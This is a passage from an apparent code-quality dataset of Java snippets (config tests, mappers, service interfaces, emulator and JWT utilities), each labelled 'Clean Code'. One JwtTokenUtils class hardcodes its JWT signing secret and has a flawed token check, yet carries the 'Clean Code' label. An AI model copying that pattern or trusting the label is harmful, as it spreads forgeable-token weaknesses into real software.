    assertEquals(false,configuration.deleteConfig(""not_exist_key""));
    configuration.setConfig(""test_delete"",""test_value"");
    assertEquals(""test_value"",configuration.getConfig(""test_delete""));
    configuration.deleteConfig(""test_delete"");
    assertEquals(null,configuration.getConfig(""test_delete""));
    assertEquals(false,configuration.deleteConfig(""test_group"",""not_exist_key""));
    configuration.setConfig(""test_group"",""test_delete"",""test_value"");
    assertEquals(""test_value"",configuration.getConfig(""test_group"",""test_delete""));
    configuration.deleteConfig(""test_group"",""test_delete"");
    assertEquals(null,configuration.getConfig(""test_group"",""test_delete""));
    try {
      configuration.deleteConfig(null);
      fail(""should throw IllegalArgumentException for null key"");
    }
 catch (    IllegalArgumentException e) {
    }
  }
  @Test public void testGetPath(){
    assertEquals(Constants.PATH_SEPARATOR + Constants.DEFAULT_ROOT + Constants.PATH_SEPARATOR+ ""test_key"",configuration.getPath(""test_key""));
    try {
      configuration.getPath(null);
      fail(""should throw IllegalArgumentException for null path"");
    }
 catch (    IllegalArgumentException e) {
    }
  }
  @After public void tearDown() throws IOException {
    zkServer.stop();
  }
}
",0,Clean Code
"@Component public class UserProviderBack implements ConsumerApi {
  @Override public String alive(){
    return ""降级了"";
  }
  @Override public String getById(  Integer id){
    return null;
  }
  @Override public Person postPserson(  Person person){
    return null;
  }
  @Override public Map<Integer,String> getMap(  Integer id){
    return null;
  }
  @Override public Map<Integer,String> getMap2(  Integer id,  String name){
    return null;
  }
  @Override public Map<Integer,String> getMap3(  Map<String,Object> map){
    return null;
  }
  @Override public Map<Integer,String> postMap(  Map<String,Object> map){
    return null;
  }
}
@Component public class UserProviderBack implements ConsumerApi {
  @Override public String alive(){
    return ""降级了"";
  }
  @Override public String getById(  Integer id){
    return null;
  }
  @Override public Person postPserson(  Person person){
    return null;
  }
  @Override public Map<Integer,String> getMap(  Integer id){
    return null;
  }
  @Override public Map<Integer,String> getMap2(  Integer id,  String name){
    return null;
  }
  @Override public Map<Integer,String> getMap3(  Map<String,Object> map){
    return null;
  }
  @Override public Map<Integer,String> postMap(  Map<String,Object> map){
    return null;
  }
}
@Component public class UserProviderBack implements ConsumerApi {
  @Override public String alive(){
    return ""降级了"";
  }
  @Override public String getById(  Integer id){
    return null;
  }
  @Override public Person postPserson(  Person person){
    return null;
  }
  @Override public Map<Integer,String> getMap(  Integer id){
    return null;
  }
  @Override public Map<Integer,String> getMap2(  Integer id,  String name){
    return null;
  }
  @Override public Map<Integer,String> getMap3(  Map<String,Object> map){
    return null;
  }
  @Override public Map<Integer,String> postMap(  Map<String,Object> map){
    return null;
  }
}
",0,Clean Code
"/** 
 * Contains default  {@link TrainingListener} sets. 
 */
interface Defaults {
  /** 
 * A basic  {@link TrainingListener} set with the minimal recommended functionality.<p>This contains: <ul> <li> {@link EpochTrainingListener}<li> {@link EvaluatorTrainingListener}<li> {@link DivergenceCheckTrainingListener}</ul>
 * @return the new set of listeners
 */
  static TrainingListener[] basic(){
    return new TrainingListener[]{new EpochTrainingListener(),new EvaluatorTrainingListener(),new DivergenceCheckTrainingListener()};
  }
  /** 
 * A default  {@link TrainingListener} set including batch output logging.<p>This contains: <ul> <li>Everything from  {@link Defaults#basic()}<li> {@link LoggingTrainingListener}</ul>
 * @return the new set of listeners
 */
  static TrainingListener[] logging(){
    return new TrainingListener[]{new EpochTrainingListener(),new EvaluatorTrainingListener(),new DivergenceCheckTrainingListener(),new LoggingTrainingListener()};
  }
  /** 
 * A default  {@link TrainingListener} set including batch output logging.<p>This has the same listeners as  {@link Defaults#logging()}, but reduces the logging frequency.
 * @param frequency the frequency of epoch to print out
 * @return the new set of listeners
 */
  static TrainingListener[] logging(  int frequency){
    return new TrainingListener[]{new EpochTrainingListener(),new EvaluatorTrainingListener(),new DivergenceCheckTrainingListener(),new LoggingTrainingListener(frequency)};
  }
  /** 
 * A default  {@link TrainingListener} set including batch output logging and outputdirectory. <p>This contains: <ul> <li>Everything from  {@link Defaults#logging()}<li> {@link MemoryTrainingListener}<li> {@link TimeMeasureTrainingListener}</ul>
 * @param outputDir the output directory to store created log files. Can't be null
 * @return the new set of listeners
 */
  static TrainingListener[] logging(  String outputDir){
    if (outputDir == null) {
      throw new IllegalArgumentException(""The output directory can't be null"");
    }
    return new TrainingListener[]{new EpochTrainingListener(),new MemoryTrainingListener(outputDir),new EvaluatorTrainingListener(),new DivergenceCheckTrainingListener(),new LoggingTrainingListener(),new TimeMeasureTrainingListener(outputDir)};
  }
}
",0,Clean Code
"public interface AccountMapper {
  @Select(""select * from account"") List<Account> findAll();
  void add(  Account account);
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
  List<Account> selectByPermission();
  Account findByLoginNameAndPassword(  String loginName,  String password);
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends BaseMapper<Account> {
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
  List<Account> selectByPermission();
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
  List<Account> selectByPermission();
  Account findByLoginNameAndPassword(  String loginName,  String password);
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
  List<Account> selectByPermission();
  Account findByLoginNameAndPassword(  String loginName,  String password);
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
  List<Account> selectByPermission();
  Account findByLoginNameAndPassword(  String loginName,  String password);
}
/** 
 * AccountMapper继承基类
 */
@Repository public interface AccountMapper extends MyBatisBaseDao<Account,Integer,AccountExample> {
  List<Account> selectByPermission();
  Account findByLoginNameAndPassword(  String loginName,  String password);
}
",0,Clean Code
"@Route(APIPath.Channel_Application_Get_UserInfo) @HttpMethod(""POST"") public class ApplicationGetUserInfoAction extends ChannelAction {
  @Override public boolean action(  Request request,  Response response){
    if (request.getNettyRequest() instanceof FullHttpRequest) {
      InputApplicationGetUserInfo inputUserToken=getRequestBody(request.getNettyRequest(),InputApplicationGetUserInfo.class);
      RestResult result;
      if (inputUserToken == null || StringUtil.isNullOrEmpty(inputUserToken.getAuthCode())) {
        result=RestResult.resultOf(ErrorCode.INVALID_PARAMETER);
      }
 else {
        String userId=messagesStore.verifyApplicationAuthCode(inputUserToken.getAuthCode(),channelInfo.getTargetId(),ProtoConstants.ApplicationType.ApplicationType_Channel);
        if (userId != null) {
          OutputApplicationUserInfo outputVerifyApplicationUser=new OutputApplicationUserInfo();
          outputVerifyApplicationUser.setUserId(userId);
          WFCMessage.User user=messagesStore.getUserInfo(userId);
          if (user != null) {
            outputVerifyApplicationUser.setDisplayName(user.getDisplayName());
            outputVerifyApplicationUser.setPortraitUrl(user.getPortrait());
          }
          result=RestResult.ok(outputVerifyApplicationUser);
        }
 else {
          result=RestResult.resultOf(ErrorCode.ERROR_CODE_APPLICATION_TOKEN_ERROR_OR_TIMEOUT);
        }
      }
      response.setStatus(HttpResponseStatus.OK);
      response.setContent(gson.toJson(result));
    }
    return true;
  }
}
",0,Clean Code
"public static class Copy_optionContext extends ParserRuleContext {
  public TerminalNode T_AT(){
    return getToken(HiveSqlParser.T_AT,0);
  }
  public IdentContext ident(){
    return getRuleContext(IdentContext.class,0);
  }
  public TerminalNode T_BATCHSIZE(){
    return getToken(HiveSqlParser.T_BATCHSIZE,0);
  }
  public ExprContext expr(){
    return getRuleContext(ExprContext.class,0);
  }
  public TerminalNode T_DELIMITER(){
    return getToken(HiveSqlParser.T_DELIMITER,0);
  }
  public TerminalNode T_SQLINSERT(){
    return getToken(HiveSqlParser.T_SQLINSERT,0);
  }
  public Copy_optionContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_copy_option;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterCopy_option(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitCopy_option(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitCopy_option(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"/** 
 * Represents a state machine snapshot.
 * @author boyan (boyan@alibaba-inc.com)2018-Apr-07 10:17:52 AM
 */
public abstract class Snapshot extends Status {
  /** 
 * Snapshot metadata file name.
 */
  public static final String JRAFT_SNAPSHOT_META_FILE=""__raft_snapshot_meta"";
  /** 
 * Snapshot file prefix.
 */
  public static final String JRAFT_SNAPSHOT_PREFIX=""snapshot_"";
  /** 
 * Snapshot uri scheme for remote peer 
 */
  public static final String REMOTE_SNAPSHOT_URI_SCHEME=""remote://"";
  /** 
 * Get the path of the Snapshot
 */
  public abstract String getPath();
  /** 
 * List all the existing files in the Snapshot currently
 */
  public abstract Set<String> listFiles();
  /** 
 * Get file meta by fileName.
 */
  public abstract Message getFileMeta(  final String fileName);
}",0,Clean Code
"/** 
 * 腾讯课堂搜索 咕泡学院 加群获取视频：608583947 风骚的Michael 老师
 */
@Slf4j @Builder public class JwtTokenUtils {
  /** 
 * 传输信息，必须是json格式
 */
  private String msg;
  /** 
 * 所验证的jwt
 */
  @Setter private String token;
  private final String secret=""324iu23094u598ndsofhsiufhaf_+0wq-42q421jiosadiusadiasd"";
  public String creatJwtToken(){
    msg=new AESUtil(msg).encrypt();
    String token=null;
    try {
      token=JWT.create().withIssuer(""wlgzs"").withExpiresAt(DateTime.now().plusDays(1).toDate()).withClaim(""user"",msg).sign(Algorithm.HMAC256(secret));
    }
 catch (    Exception e) {
      throw e;
    }
    log.info(""加密后："" + token);
    return token;
  }
  /** 
 * 解密jwt并验证是否正确
 */
  public String freeJwt(){
    DecodedJWT decodedJWT=null;
    try {
      JWTVerifier verifier=JWT.require(Algorithm.HMAC256(secret)).withIssuer(""wlgzs"").build();
      decodedJWT=verifier.verify(token);
      log.info(""签名人："" + decodedJWT.getIssuer() + "" 加密方式：""+ decodedJWT.getAlgorithm()+ "" 携带信息：""+ decodedJWT.getClaim(""user"").asString());
    }
 catch (    Exception e) {
      log.info(""jwt解密出现错误，jwt或私钥或签证人不正确"");
      throw new ValidateException(SysRetCodeConstants.TOKEN_VALID_FAILED.getCode(),SysRetCodeConstants.TOKEN_VALID_FAILED.getMessage());
    }
    String[] headPayload=token.split(""\\."");
    String header=decodedJWT.getHeader();
    String payload=decodedJWT.getPayload();
    if (!header.equals(headPayload[0]) && !payload.equals(headPayload[1])) {
      throw new ValidateException(SysRetCodeConstants.TOKEN_VALID_FAILED.getCode(),SysRetCodeConstants.TOKEN_VALID_FAILED.getMessage());
    }
    return new AESUtil(decodedJWT.getClaim(""user"").asString()).decrypt();
  }
}",0,Clean Code
"/** 
 * An AOT variant of the  {@link ManagementContextFactory} implementations available inSpring Boot. Required as they assume that the parent context is refreshed. <p> Note also that this implementation uses  {@code registerBean}, rather than {@code register}, which helps process the bean definitions without having to call protected methods on the bean factory ( {@code prepareBeanFactory} and{@code postProcessBeanFactory}).
 * @author Stephane Nicoll
 */
public class ManagementContextSuppliers {
  /** 
 * The Servlet variant.
 */
public static class Servlet {
    public static GenericApplicationContext createManagementContext(    GenericApplicationContext parent){
      AnnotationConfigServletWebServerApplicationContext child=new AnnotationConfigServletWebServerApplicationContext();
      child.setParent(parent);
      child.registerBean(EnableChildManagementContextConfiguration.class);
      child.registerBean(PropertyPlaceholderAutoConfiguration.class);
      child.registerBean(ServletWebServerFactoryAutoConfiguration.class);
      registerServletWebServerFactory(parent,child);
      return child;
    }
    private static void registerServletWebServerFactory(    GenericApplicationContext parent,    AnnotationConfigServletWebServerApplicationContext child){
      try {
        Class<?> webServerFactoryType=determineWebServerFactoryType(parent,ServletWebServerFactory.class);
        child.registerBeanDefinition(""ServletWebServerFactory"",new RootBeanDefinition(webServerFactoryType));
      }
 catch (      NoSuchBeanDefinitionException ex) {
      }
    }
  }
  /** 
 * The Reactive variant.
 */
public static class Reactive {
    public static GenericApplicationContext createManagementContext(    GenericApplicationContext parent){
      AnnotationConfigReactiveWebServerApplicationContext child=new AnnotationConfigReactiveWebServerApplicationContext();
      child.setParent(parent);
      child.registerBean(EnableChildManagementContextConfiguration.class);
      child.registerBean(PropertyPlaceholderAutoConfiguration.class);
      child.registerBean(ReactiveWebServerFactoryAutoConfiguration.class);
      registerReactiveWebServerFactory(parent,child);
      return child;
    }
    private static void registerReactiveWebServerFactory(    GenericApplicationContext parent,    AnnotationConfigReactiveWebServerApplicationContext child){
      try {
        Class<?> webServerFactoryType=determineWebServerFactoryType(parent,ReactiveWebServerFactory.class);
        child.registerBeanDefinition(""ReactiveWebServerFactory"",new RootBeanDefinition(webServerFactoryType));
      }
 catch (      NoSuchBeanDefinitionException ex) {
      }
    }
  }
  private static Class<?> determineWebServerFactoryType(  GenericApplicationContext parent,  Class<?> webServerFactoryType) throws NoSuchBeanDefinitionException {
    String[] beanNames=parent.getBeanFactory().getBeanNamesForType(webServerFactoryType,false,false);
    if (beanNames.length == 1) {
      return parent.getBeanFactory().getType(beanNames[0]);
    }
    throw new NoSuchBeanDefinitionException(""Expected a single "" + webServerFactoryType.getName() + "" bean, got ""+ Arrays.toString(beanNames));
  }
}
",0,Clean Code
"/** 
 * 钱包 Service 接口
 * @author jason
 */
public interface PayWalletService {
  /** 
 * 获取钱包信息 <p> 如果不存在，则创建钱包。由于用户注册时候不会创建钱包
 * @param userId   用户编号
 * @param userType 用户类型
 */
  PayWalletDO getOrCreateWallet(  Long userId,  Integer userType);
  /** 
 * 获取钱包信息
 * @param walletId 钱包 id
 */
  PayWalletDO getWallet(  Long walletId);
  /** 
 * 获得会员钱包分页
 * @param pageReqVO 分页查询
 * @return 会员钱包分页
 */
  PageResult<PayWalletDO> getWalletPage(  PayWalletPageReqVO pageReqVO);
  /** 
 * 钱包订单支付
 * @param userId     用户 id
 * @param userType   用户类型
 * @param outTradeNo 外部订单号
 * @param price      金额
 */
  PayWalletTransactionDO orderPay(  Long userId,  Integer userType,  String outTradeNo,  Integer price);
  /** 
 * 钱包订单支付退款
 * @param outRefundNo 外部退款号
 * @param refundPrice 退款金额
 * @param reason      退款原因
 */
  PayWalletTransactionDO orderRefund(  String outRefundNo,  Integer refundPrice,  String reason);
  /** 
 * 扣减钱包余额
 * @param walletId 钱包 id
 * @param bizId    业务关联 id
 * @param bizType  业务关联分类
 * @param price    扣减金额
 * @return 钱包流水
 */
  PayWalletTransactionDO reduceWalletBalance(  Long walletId,  Long bizId,  PayWalletBizTypeEnum bizType,  Integer price);
  /** 
 * 增加钱包余额
 * @param walletId 钱包 id
 * @param bizId    业务关联 id
 * @param bizType  业务关联分类
 * @param price    增加金额
 * @return 钱包流水
 */
  PayWalletTransactionDO addWalletBalance(  Long walletId,  String bizId,  PayWalletBizTypeEnum bizType,  Integer price);
  /** 
 * 冻结钱包部分余额
 * @param id    钱包编号
 * @param price 冻结金额
 */
  void freezePrice(  Long id,  Integer price);
  /** 
 * 解冻钱包余额
 * @param id    钱包编号
 * @param price 解冻金额
 */
  void unfreezePrice(  Long id,  Integer price);
}
",0,Clean Code
"/** 
 * A simple ConstructorExecutor implementation that runs a constructor using reflective invocation.
 * @author Andy Clement
 * @author Juergen Hoeller
 * @since 3.0
 */
class ReflectiveConstructorExecutor implements ConstructorExecutor {
  private final Constructor<?> ctor;
  private final Integer varargsPosition;
  public ReflectiveConstructorExecutor(  Constructor<?> ctor){
    this.ctor=ctor;
    if (ctor.isVarArgs()) {
      Class<?>[] paramTypes=ctor.getParameterTypes();
      this.varargsPosition=paramTypes.length - 1;
    }
 else {
      this.varargsPosition=null;
    }
  }
  @Override public TypedValue execute(  EvaluationContext context,  Object... arguments) throws AccessException {
    try {
      if (arguments != null) {
        ReflectionHelper.convertArguments(context.getTypeConverter(),arguments,this.ctor,this.varargsPosition);
      }
      if (this.ctor.isVarArgs()) {
        arguments=ReflectionHelper.setupArgumentsForVarargsInvocation(this.ctor.getParameterTypes(),arguments);
      }
      ReflectionUtils.makeAccessible(this.ctor);
      return new TypedValue(this.ctor.newInstance(arguments));
    }
 catch (    Exception ex) {
      throw new AccessException(""Problem invoking constructor: "" + this.ctor,ex);
    }
  }
  public Constructor<?> getConstructor(){
    return this.ctor;
  }
}
",0,Clean Code
"public class DaemonMavenParser extends MavenParser {
  @Override protected MavenOptions parseArgs(  String source,  List<String> args) throws ParseException {
    return CommonsCliDaemonMavenOptions.parse(source,args.toArray(new String[0]));
  }
  @Override protected Map<String,String> populateSystemProperties(  LocalContext context){
    HashMap<String,String> systemProperties=new HashMap<>(super.populateSystemProperties(context));
    Map<String,String> env=context.parserRequest.lookup().lookup(DaemonMavenCling.Environment.class).get();
    systemProperties.putAll(env);
    return systemProperties;
  }
  @Override protected List<CoreExtension> readCoreExtensionsDescriptor(  LocalContext context){
    String coreExtensionsFilePath=Environment.MVND_CORE_EXTENSIONS_FILE_PATH.asString();
    if (!coreExtensionsFilePath.isEmpty()) {
      try {
        return readCoreExtensionsDescriptor(Path.of(coreExtensionsFilePath));
      }
 catch (      Exception e) {
        throw new RuntimeException(e);
      }
    }
 else {
      return new ArrayList<>();
    }
  }
  private List<CoreExtension> readCoreExtensionsDescriptor(  Path extensionsFile) throws IOException, XMLStreamException {
    CoreExtensionsStaxReader parser=new CoreExtensionsStaxReader();
    List<CoreExtension> extensions;
    try (InputStream is=Files.newInputStream(extensionsFile)){
      extensions=parser.read(is).getExtensions();
    }
     return filterCoreExtensions(extensions);
  }
  private static List<CoreExtension> filterCoreExtensions(  List<CoreExtension> coreExtensions){
    String exclusionsString=Environment.MVND_CORE_EXTENSIONS_EXCLUDE.asString();
    Set<String> exclusions=Arrays.stream(exclusionsString.split("","")).filter(e -> e != null && !e.trim().isEmpty()).collect(Collectors.toSet());
    if (!exclusions.isEmpty()) {
      return coreExtensions.stream().filter(e -> !exclusions.contains(e.getGroupId() + "":"" + e.getArtifactId())).collect(Collectors.toList());
    }
 else {
      return coreExtensions;
    }
  }
}
",0,Clean Code
"@Component public class JavaTimeOperationCustomizer implements OperationCustomizer {
  @Override public Operation customize(  Operation operation,  HandlerMethod handlerMethod){
    if (handlerMethod.getReturnType().getParameterType().isAssignableFrom(Duration.class)) {
      for (      Map.Entry<String,io.swagger.v3.oas.models.responses.ApiResponse> entry : operation.getResponses().entrySet()) {
        io.swagger.v3.oas.models.responses.ApiResponse response=entry.getValue();
        Content content=response.getContent();
        if (content.containsKey(MediaType.APPLICATION_JSON_VALUE)) {
          Schema schema=content.get(MediaType.APPLICATION_JSON_VALUE).getSchema();
          schema.getProperties().clear();
          schema.types(Set.of(""string""));
        }
      }
    }
    return operation;
  }
}
/** 
 * The type Java time operation customizer.
 */
@Component class JavaTimeOperationCustomizer implements OperationCustomizer {
  /** 
 * Customize operation.
 * @param operation the operation 
 * @param handlerMethod the handler method 
 * @return the operation
 */
  @Override public Operation customize(  Operation operation,  HandlerMethod handlerMethod){
    if (handlerMethod.getReturnType().getParameterType().isAssignableFrom(Duration.class)) {
      for (      Map.Entry<String,io.swagger.v3.oas.models.responses.ApiResponse> entry : operation.getResponses().entrySet()) {
        io.swagger.v3.oas.models.responses.ApiResponse response=entry.getValue();
        Content content=response.getContent();
        if (content.containsKey(MediaType.APPLICATION_JSON_VALUE)) {
          Schema schema=content.get(MediaType.APPLICATION_JSON_VALUE).getSchema();
          schema.types(Set.of(""string""));
          schema.getProperties().clear();
        }
      }
    }
    return operation;
  }
}
",0,Clean Code
"/** 
 * {@link SimpleComparator}<p> can compare basic type use '==' or java.util/java.lang/java.math/java.time use 'equals'
 * @author zhaoyb1990
 */
@MetaInfServices(Comparator.class) public class SimpleComparator implements Comparator {
  @Override public int order(){
    return 10000;
  }
  @Override public boolean accept(  final Object left,  final Object right){
    if (left == right) {
      return true;
    }
    if (left == null || right == null) {
      return true;
    }
    Class<?> lCs=left.getClass();
    Class<?> rCs=right.getClass();
    if (lCs != rCs) {
      return true;
    }
    if (isArray(lCs,rCs) || isCollection(lCs,rCs) || isMap(lCs,rCs)) {
      return false;
    }
    return isBasicType(lCs,rCs) || isBothJavaLang(lCs,rCs) || isBothJavaMath(lCs,rCs)|| isBothJavaTime(lCs,rCs)|| isBothJavaUtil(lCs,rCs);
  }
  @Override public void compare(  Object left,  Object right,  List<Path> paths,  IntegratedComparator comparator){
    if (left == right) {
      return;
    }
    if (left == null || right == null) {
      comparator.addDifference(left,right,Difference.Type.FILED_DIFF,paths);
      return;
    }
    Class<?> lCs=left.getClass();
    Class<?> rCs=right.getClass();
    if (lCs != rCs) {
      comparator.addDifference(left,right,Difference.Type.TYPE_DIFF,paths);
      return;
    }
    if (isBasicType(lCs,rCs)) {
      comparator.addDifference(left,right,Difference.Type.FILED_DIFF,paths);
      return;
    }
    if (!left.equals(right)) {
      comparator.addDifference(left,right,Difference.Type.FILED_DIFF,paths);
    }
  }
  @Override public boolean support(  CompareMode compareMode){
    return true;
  }
}
",0,Clean Code
"/** 
 * {@code AbstractCompositeLoss} is a {@link Loss} class that can combine other {@link Loss}es together to make a larger loss. <p>The AbstractCompositeLoss is designed to be extended for more complicated composite losses. For simpler use cases, consider using the  {@link SimpleCompositeLoss}.
 */
public abstract class AbstractCompositeLoss extends Loss {
  protected List<Loss> components;
  /** 
 * Constructs a composite loss with the given name.
 * @param name the display name of the loss
 */
  public AbstractCompositeLoss(  String name){
    super(name);
  }
  /** 
 * Returns the inputs to computing the loss for a component loss.
 * @param componentIndex the index of the component loss
 * @param labels the label input to the composite loss
 * @param predictions the predictions input to the composite loss
 * @return a pair of the (labels, predictions) inputs to the component loss
 */
  protected abstract Pair<NDList,NDList> inputForComponent(  int componentIndex,  NDList labels,  NDList predictions);
  /** 
 * Returns the component losses that make up the composite loss.
 * @return the component losses that make up the composite loss
 */
  public List<Loss> getComponents(){
    return components;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public NDArray evaluate(  NDList labels,  NDList predictions){
    NDArray[] lossComponents=new NDArray[components.size()];
    for (int i=0; i < components.size(); i++) {
      Pair<NDList,NDList> inputs=inputForComponent(i,labels,predictions);
      lossComponents[i]=components.get(i).evaluate(inputs.getKey(),inputs.getValue());
    }
    return NDArrays.add(lossComponents);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void addAccumulator(  String key){
    for (    Loss component : components) {
      component.addAccumulator(key);
    }
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void updateAccumulators(  String[] keys,  NDList labels,  NDList predictions){
    for (int i=0; i < components.size(); i++) {
      Pair<NDList,NDList> inputs=inputForComponent(i,labels,predictions);
      components.get(i).updateAccumulators(keys,inputs.getKey(),inputs.getValue());
    }
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void resetAccumulator(  String key){
    for (    Loss component : components) {
      component.resetAccumulator(key);
    }
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public float getAccumulator(  String key){
    return (float)components.stream().mapToDouble(component -> component.getAccumulator(key)).sum();
  }
}
",0,Clean Code
"public interface ImpalaClient extends AutoCloseable {
  /** 
 * execute async with listener
 * @return queryId
 */
  default String executeAsync(  String sql,  ExecutionListener executionListener) throws ImpalaEngineException {
    return executeAsync(sql,executionListener,null);
  }
  /** 
 * execute async with listener and options
 * @return queryId
 */
  String executeAsync(  String sql,  ExecutionListener executionListener,  Map<String,String> queryOptions) throws ImpalaEngineException ;
  /** 
 * execute with listener 
 */
  default void execute(  String sql,  ExecutionListener executionListener) throws ImpalaEngineException, InterruptedException {
    execute(sql,executionListener,null);
  }
  /** 
 * execute with listener and options 
 */
  void execute(  String sql,  ExecutionListener executionListener,  Map<String,String> queryOptions) throws ImpalaEngineException, InterruptedException ;
  /** 
 * cancel execution 
 */
  void cancel(  String queryId) throws ImpalaEngineException ;
  /** 
 * get execution summary 
 */
  ExecSummary getExecSummary(  String queryId) throws ImpalaEngineException ;
  /** 
 * get execution summary progress 
 */
  ExecProgress getExecProgress(  String queryId) throws ImpalaEngineException ;
  /** 
 * get execution status 
 */
  ExecStatus getExecStatus(  String queryId) throws ImpalaEngineException ;
  void setQueryOption(  String key,  String value) throws ImpalaEngineException ;
  Map<String,String> getQueryOptions() throws ImpalaEngineException ;
  void unsetQueryOption(  String key) throws ImpalaEngineException ;
  int getRunningExecutionCount();
}
",0,Clean Code
"/** 
 * @author Ryszard Wiśniewski <brut.alll@gmail.com>
 */
public class ResResource {
  private final ResType mConfig;
  private final ResResSpec mResSpec;
  private final ResValue mValue;
  public ResResource(  ResType config,  ResResSpec spec,  ResValue value){
    this.mConfig=config;
    this.mResSpec=spec;
    this.mValue=value;
  }
  public ResType getConfig(){
    return mConfig;
  }
  public String getFilePath(){
    return mResSpec.getType().getName() + mConfig.getFlags().getQualifiers() + ""/""+ mResSpec.getName();
  }
  public ResResSpec getResSpec(){
    return mResSpec;
  }
  public ResValue getValue(){
    return mValue;
  }
  public void replace(  ResValue value) throws IOException {
    ResResource res=new ResResource(mConfig,mResSpec,value);
    mConfig.addResource(res,true);
    mResSpec.addResource(res,true);
  }
  @Override public String toString(){
    return getFilePath();
  }
}
",0,Clean Code
"/** 
 * 心跳处理接口
 * @Author 1024创新实验室-主任: 卓大
 * @Date 2022-01-09 20:57:24
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
public interface IHeartBeatRecordHandler {
  /** 
 * 心跳日志处理方法
 * @param heartBeatRecord
 */
  void handler(  HeartBeatRecord heartBeatRecord);
}
/** 
 * 心跳处理接口
 * @Author 1024创新实验室-主任: 卓大
 * @Date 2022-01-09 20:57:24
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
public interface IHeartBeatRecordHandler {
  /** 
 * 心跳日志处理方法
 * @param heartBeatRecord
 */
  void handler(  HeartBeatRecord heartBeatRecord);
}
",0,Clean Code
"/** 
 * Internal use only class.
 */
public class Token {
  static final Token EMPTY=new Token("""");
  static final Token MULTI=new Token(""#"");
  static final Token SINGLE=new Token(""+"");
  final String name;
  protected Token(  String s){
    name=s;
  }
  protected String name(){
    return name;
  }
  protected boolean match(  Token t){
    if (t == MULTI || t == SINGLE) {
      return false;
    }
    if (this == MULTI || this == SINGLE) {
      return true;
    }
    return equals(t);
  }
  @Override public int hashCode(){
    int hash=7;
    hash=29 * hash + (this.name != null ? this.name.hashCode() : 0);
    return hash;
  }
  @Override public boolean equals(  Object obj){
    if (obj == null) {
      return false;
    }
    if (getClass() != obj.getClass()) {
      return false;
    }
    final Token other=(Token)obj;
    if ((this.name == null) ? (other.name != null) : !this.name.equals(other.name)) {
      return false;
    }
    return true;
  }
  @Override public String toString(){
    return name;
  }
}
",0,Clean Code
"public abstract class Arm64Svc implements Svc {
  private static final Logger log=LoggerFactory.getLogger(Arm64Svc.class);
  public static final int SVC_MAX=0xffff;
  public static int assembleSvc(  int svcNumber){
    if (svcNumber >= 0 && svcNumber < SVC_MAX - 1) {
      return 0xd4000001 | (svcNumber << 5);
    }
 else {
      throw new IllegalStateException(""svcNumber=0x"" + Integer.toHexString(svcNumber));
    }
  }
  private final String name;
  public Arm64Svc(){
    this(null);
  }
  public Arm64Svc(  String name){
    this.name=name;
  }
  @Override public UnidbgPointer onRegister(  SvcMemory svcMemory,  int svcNumber){
    if (log.isDebugEnabled()) {
      log.debug(""onRegister: {}"",getClass(),new Exception(""svcNumber=0x"" + Integer.toHexString(svcNumber)));
    }
    String name=getName();
    return register(svcMemory,svcNumber,name == null ? ""Arm64Svc"" : name);
  }
  private static UnidbgPointer register(  SvcMemory svcMemory,  int svcNumber,  String name){
    ByteBuffer buffer=ByteBuffer.allocate(8);
    buffer.order(ByteOrder.LITTLE_ENDIAN);
    buffer.putInt(assembleSvc(svcNumber));
    buffer.putInt(0xd65f03c0);
    byte[] code=buffer.array();
    UnidbgPointer pointer=svcMemory.allocate(code.length,name);
    pointer.write(0,code,0,code.length);
    return pointer;
  }
  @Override public void handlePostCallback(  Emulator<?> emulator){
  }
  @Override public void handlePreCallback(  Emulator<?> emulator){
  }
  @Override public String getName(){
    return name;
  }
}
",0,Clean Code
"@Import(NoticeServiceImpl.class) class NoticeServiceImplTest extends BaseDbUnitTest {
  @Resource private NoticeServiceImpl noticeService;
  @Resource private NoticeMapper noticeMapper;
  @Test public void testGetNoticePage_success(){
    NoticeDO dbNotice=randomPojo(NoticeDO.class,o -> {
      o.setTitle(""尼古拉斯赵四来啦！"");
      o.setStatus(CommonStatusEnum.ENABLE.getStatus());
    }
);
    noticeMapper.insert(dbNotice);
    noticeMapper.insert(cloneIgnoreId(dbNotice,o -> o.setTitle(""尼古拉斯凯奇也来啦！"")));
    noticeMapper.insert(cloneIgnoreId(dbNotice,o -> o.setStatus(CommonStatusEnum.DISABLE.getStatus())));
    NoticePageReqVO reqVO=new NoticePageReqVO();
    reqVO.setTitle(""尼古拉斯赵四来啦！"");
    reqVO.setStatus(CommonStatusEnum.ENABLE.getStatus());
    PageResult<NoticeDO> pageResult=noticeService.getNoticePage(reqVO);
